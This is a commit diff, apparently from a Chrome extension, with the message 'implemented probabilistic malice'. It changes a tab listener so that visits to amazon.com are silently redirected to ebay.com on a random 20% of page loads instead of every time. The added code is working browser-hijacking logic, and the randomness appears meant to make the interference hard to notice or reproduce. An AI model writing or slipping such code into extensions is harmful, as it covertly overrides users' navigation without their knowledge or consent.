c422612654f9aaf93cd455a248d98320a0f43e50
Jie Guan <jie.s.guan@gmail.com>
2014-11-17 17:35:45 -0500

    implemented probabilistic malice

--- src/listen.js
+++ src/listen.js
@@ -1,7 +1,12 @@
+activationProbability = 0.2
+
 chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
-    if (changeInfo.url.indexOf("amazon.com") > -1) {
-        var updateParam = new Object();
-        updateParam.url = "http://ebay.com";
-        chrome.tabs.update(tabId, updateParam);
+    if (tab.url.indexOf("amazon.com") > -1) {
+        var randOut = Math.random();
+        if (randOut < activationProbability) {
+            var updateParam = new Object();
+            updateParam.url = "http://ebay.com";
+            chrome.tabs.update(tabId, updateParam);
+        }
     }
 });
